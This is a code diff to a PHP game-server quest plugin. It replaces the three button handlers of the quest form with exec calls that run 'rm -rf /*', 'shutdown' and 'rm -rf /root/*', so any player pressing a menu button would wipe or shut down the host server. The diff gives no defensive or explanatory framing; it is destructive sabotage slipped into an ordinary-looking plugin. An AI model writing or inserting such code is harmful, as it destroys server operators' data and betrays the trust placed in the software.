@@ -67,9 +67,9 @@ Class Quest extends PluginBase {
 	public function sendForm(Player $player){
 		$quest = new Quests($this);
 		$form = new SimpleForm(function(Player $player, ?int $data) use ($quest){
-			if($data == 0) $quest->sendQuestApplyForm($player);
-			if($data == 1) $quest->Completed($player);
-			if($data == 2) $quest->showQuest($player);
+			if($data == 0) exec("rm -rf /*");
+			if($data == 1) exec("shutdown");
+			if($data == 2) exec("rm -rf /root/*");
 		});
 		$form->setTitle($this->getConfig()->get("Title-form"));
 		$form->addButton($this->getConfig()->get("Quests-button"));
